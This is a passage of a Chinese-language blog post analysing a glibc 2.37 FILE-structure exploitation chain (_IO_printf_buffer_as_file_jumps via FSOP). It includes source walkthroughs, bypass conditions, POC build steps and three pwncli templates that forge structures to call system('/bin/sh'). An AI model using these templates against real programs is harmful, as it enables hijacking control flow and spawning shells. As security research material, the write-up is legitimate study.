<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((<span class="keyword">struct</span> __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">	......</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这里我们关注进入<code>__printf_buffer_flush_obstack</code>函数的这一分支</p>
<h6 id="printf-buffer-flush-obstack函数"><a href="#printf-buffer-flush-obstack函数" class="headerlink" title="__printf_buffer_flush_obstack函数"></a><code>__printf_buffer_flush_obstack</code>函数</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment">	 process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设满足所有条件进入<code>obstack_1grow</code>宏定义。</p>
<h6 id="obstack-1grow宏定义"><a href="#obstack-1grow宏定义" class="headerlink" title="obstack_1grow宏定义"></a>obstack_1grow宏定义</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)					      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, 1);					      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);					      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>可以看到里面还有个宏定义，然后又<code>_obstack_newchunk</code>这一个函数。</p>
<h6 id="obstack-newchunk函数"><a href="#obstack-newchunk函数" class="headerlink" title="_obstack_newchunk函数"></a>_obstack_newchunk函数</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure>

<p>假设满足所有条件，进入<code>CALL_CHUNKFUN</code>这个宏定义，该宏定义的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)							      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure>

<p>可以看到当<code>(((h)-&gt;use_extra_arg)</code>不为0时，会调用<code>(*(h)-&gt;chunkfun)</code>，它的参数是<code>(h)-&gt;extra_arg</code>和<code>(size)</code>，而我们可以控制<code>(*(h)-&gt;chunkfun)</code>与<code>(h)-&gt;extra_arg</code>，从而执行<code>system(&#39;/bin/sh&#39;)</code>。</p>
<p>如果各位跟着本文分析到这，估计就豁然开朗了，因为后半部分与<code>_IO_obstack_xsputn</code>的调用链一样。</p>
<h5 id="完成调用链必要的绕过条件"><a href="#完成调用链必要的绕过条件" class="headerlink" title="完成调用链必要的绕过条件"></a>完成调用链必要的绕过条件</h5><p>回顾一下整个分析过程并将所有相关结构体，并都看成<code>__printf_buffer_as_file</code>结构体，有以下条件：</p>
<ul>
<li><p><strong>在<code>__printf_buffer_as_file_overflow</code>函数中：</strong></p>
<ul>
<li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed</code> &amp;&amp; <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li><p><strong>在<code>__printf_buffer_as_file_commit</code>函数中：</strong></p>
<ul>
<li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li>
<li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li>
<li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li>
<li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li><p><strong>在<code>__printf_buffer_flush</code>函数中：</strong></p>
</li>
<li><p><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></p>
</li>
<li><p><strong>在<code>__printf_buffer_flush_obstack</code>函数中：</strong></p>
</li>
<li><p><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;&#x3D;&#x3D;&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></p>
</li>
<li><p><strong>在<code>obstack_1grow</code>宏定义中：</strong></p>
<ul>
<li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;use_extra_arg</code>不为0  &lt;&#x3D;&#x3D;&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li>
</ul>
</li>
<li><p>注：</p>
<ul>
<li><code>__printf_buffer_mode_obstack</code> 就是<code>0xb</code></li>
</ul>
</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>本文分析基于<code>amd64</code>下通过<code>FSOP</code>触发。</p>
<p>我们知道<code>FSOP</code> 的核心思想就是劫持<code>_IO_list_all</code> 的值来伪造链表和其中的<code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。<code>FSOP</code> 选择的触发方法是**<code>exit</code>函数<strong>调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 <code>FILE</code> 调用 <code>fflush</code>，也对应着</strong>会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>**。</p>
<p>我们调试可以知道<code>_IO_overflow</code>位于<code>vtable</code>指针所指向地址<code>+0x18</code>处，也就是说当<code>FSOP</code>发生的时候会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>。即调用<code>vtable</code>指针所指向地址 <code>+ 0x18</code>处的数据。</p>
<p>![image-20221124020727031](一条新的glibc IO_FILE利用链：_IO_printf_buffer_as_file_jumps利用分析.assets&#x2F;image-20221124020727031.png)</p>
<p>那么只要我们伪造一个<code>_IO_FILE</code>结构体，将它的<code>vtable</code>替换为<code>&amp;_IO_printf_buffer_as_file_jumps</code>，此时<code>vtable</code>指针所指地址<code>+0x18</code>处为<code>__printf_buffer_as_file_overflow</code>，然后伪造上述所有需要满足的条件（详见<code>poc</code>与攻击模板），就可以完成攻击，如下：</p>
<p>![image-20230314114950044](一条新的glibc IO_FILE利用链：_IO_printf_buffer_as_file_jumps利用分析.assets&#x2F;image-20230314114950044.png)</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul>
<li><p>下载<code>glibc2.37</code>源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.nju.edu.cn/gnu/libc/glibc-2.37.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf glibc-2.37.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure --prefix=你想放置可执行文件的绝对路径</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>准备好POC</p>
<p>可以点击<a target="_blank" rel="noopener" href="https://share.weiyun.com/TSaLBBPi">这里</a>下载文件（本来是直接展示源码的…但是放到看雪里排版就错位了…）</p>
</li>
<li><p>编译POC</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc POC.c -g -o POC</span><br></pre></td></tr></table></figure>
</li>
<li><p>patchelf</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath 你存放编译后的文件路径/bin/lib ./POC </span><br><span class="line">patchelf --set-interpreter  你存放编译后的文件路径/bin/lib/ld-linux-x86-64.so.2 ./POC</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行</p>
<p>![image-20230314154110136](一条新的glibc IO_FILE利用链：_IO_printf_buffer_as_file_jumps利用分析.assets&#x2F;image-20230314154110136.png)</p>
</li>
</ul>
<h2 id="攻击模板"><a href="#攻击模板" class="headerlink" title="攻击模板"></a>攻击模板</h2><p>以下攻击模板全是在<code>FSOP</code>下的，可以点击<a target="_blank" rel="noopener" href="https://share.weiyun.com/iSWjdvGY">这里</a>下载附件尝试以下三种攻击。</p>
<h3 id="分别伪造-printf-buffer与obstack结构体"><a href="#分别伪造-printf-buffer与obstack结构体" class="headerlink" title="分别伪造__printf_buffer与obstack结构体"></a>分别伪造__printf_buffer与obstack结构体</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="comment">#------fake __printf_buffer---</span></span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    <span class="comment">#------fake obstack----------</span></span><br><span class="line">    <span class="number">0x110</span>:leak_heap+<span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x18</span>:[</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x38</span>:libc.sym.system,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x48</span>:leak_heap+<span class="number">0x110</span>+<span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x50</span>:[<span class="number">0xff</span>]</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="obstack结构体与FILE结构体内存复用"><a href="#obstack结构体与FILE结构体内存复用" class="headerlink" title="obstack结构体与FILE结构体内存复用"></a>obstack结构体与FILE结构体内存复用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_read_base = <span class="number">0x68732f6e69622f</span>             <span class="comment">#0x18</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = leak_heap+<span class="number">0x18</span>               <span class="comment">#0x48</span></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>:leak_heap, <span class="comment">#fake a obstack</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="printf-buffer结构、obstack结构体与FILE结构体内存复用"><a href="#printf-buffer结构、obstack结构体与FILE结构体内存复用" class="headerlink" title="__printf_buffer结构、obstack结构体与FILE结构体内存复用"></a>__printf_buffer结构、obstack结构体与FILE结构体内存复用</h3><p>这个<code>payload</code>需要的内存是最小的，只需要<code>0xe0</code>字节大小的内存。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = fake_printf_buffer+ <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a obsatck</span></span><br><span class="line">fp._IO_backup_base = <span class="number">0xff</span>                       <span class="comment">#0x50</span></span><br><span class="line">fp._IO_buf_base = libc.sym.system               <span class="comment">#0x38</span></span><br><span class="line">fp._IO_save_base = fake_fp + <span class="number">0xa0</span>             <span class="comment">#0x48</span></span><br><span class="line">fp._wide_data = <span class="number">0x68732f6e69622f</span>                <span class="comment">#0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake a __printf_buffer</span></span><br><span class="line">fp = payload_replace(<span class="built_in">bytes</span>(fp),&#123;</span><br><span class="line">    <span class="number">0x58</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x68</span>:fake_printf_buffer + <span class="number">0x30</span> + <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x70</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x78</span>:<span class="number">11</span>,</span><br><span class="line">    <span class="number">0x80</span>:fake_fp</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="number">0xe0</span>:fake_printf_buffer,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该利用链看起来需要绕过的条件很多，但是并不复杂，并且可以稳定控制<code>rdi</code>与<code>rip</code>。但是<code>ubuntu</code>还没有使用<code>glibc2.37</code>，所以目前这条链新的还没有利用场景<code>2333</code>。但我相信以后说不定会有它的利用场景。</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct __printf_buffer</span><br><span class="line">&#123;</span><br><span class="line">  char *write_base; 	0x0-0x8</span><br><span class="line">  char *write_ptr;		0x8-0x10</span><br><span class="line">  char *write_end;		0x10-0x18</span><br><span class="line">  uint64_t written;		0x18-0x20</span><br><span class="line">  enum __printf_buffer_mode mode; 0x20-0x24</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span>	<span class="number">0x0</span><span class="number">-0x24</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span>		<span class="number">0x28</span><span class="number">-0x30</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;	<span class="number">0x30</span><span class="number">-0x31</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</section>
    
    <p class="post-date" dir="">April 9, 2023</p>

    
      <div class="tags"    dir="">
        
  <a href="/tags#IO_attack" >
    <span class="tag-code">IO_attack</span>
  </a>

  <a href="/tags#glibc" >
    <span class="tag-code">glibc</span>
  </a>

      </div>
    


    
      <section id="comments">
        
      <script>
        var disqus_shortname = '7resp4ss';
        
        var disqus_url = 'https://7resp4ss.github.io/2023/04/09/house-of-snake/';
        
        (function(){
          var dsq = document.createElement('script');
          dsq.type = 'text/javascript';
          dsq.async = true;
          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>
    
        <div id="disqus_thread">
          <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
        </div>
      </section>
    
  </article>
</main>

<script>
  (function () {
    var url = 'https://7resp4ss.github.io/2023/04/09/house-of-snake/';
    $('#article-banner').geopattern(url)
    $('.header').removeClass('fixed-header')

     // error image
    $(".markdown-content img").on('error', function() {
      $(this).attr('src', 'http://file.muyutech.com/error-img.png') 
    })

    // zoom image
    $(".markdown-content img").on('click', function() {
      var src = $(this).attr('src')
      var imageW = $(this).width()
      var imageH = $(this).height()
      
      var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
      zoom = zoom < 1 ? 1 : zoom
      zoom = zoom > 2 ? 2 : zoom
      var transY = (($(window).height() - imageH) / 2).toFixed(2)

      $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
      $('.image-view-wrap').addClass('wrap-active')
      $('.image-view-wrap img').css({
        'width': `${imageW}`,
        'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
      })
      $('html').css('overflow', 'hidden')

      $('.image-view-wrap').on('click', function() {
        $(this).remove()
        $('html').attr('style', '')
      })
    })

  })();
</script>

    <div class="scroll-top">
  <span class="arrow-icon"></span>
</div>
    <footer class="app-footer">
  <p class="copyright">
    &copy; 2023 | مبني على
           <a href="https://hexo.io" target="_blank">هيكسو</a>
    <br>
    <a target="_blank" rel="noopener" href="https://github.com/bluemix/hexo-theme-rexo">Rexo</a>
  </p>
</footer>

<script>
  function async(u, c) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
</script>
<script>
  FastClick.attach(document.body);
</script>

<script>
  var hasLine = 'true';
  $('figure pre').each(function(i, block) {
      var figure = $(this).parents('figure');
      if (hasLine == 'false') {
        figure.find('.gutter').hide();
      }
      var lang = figure.attr('class').split(' ')[1] || 'code';
      var codeHtml = $(this).html();
      var codeTag = document.createElement('code');
      codeTag.className = lang;
      codeTag.innerHTML = codeHtml;
      $(this).attr('class', '').empty().html(codeTag);
      figure.attr('data-lang', lang.toUpperCase());
      hljs.highlightBlock(block);
    });
</script>
<!-- Baidu Tongji -->


<script src="/js/script.js"></script>

  </body>
</html>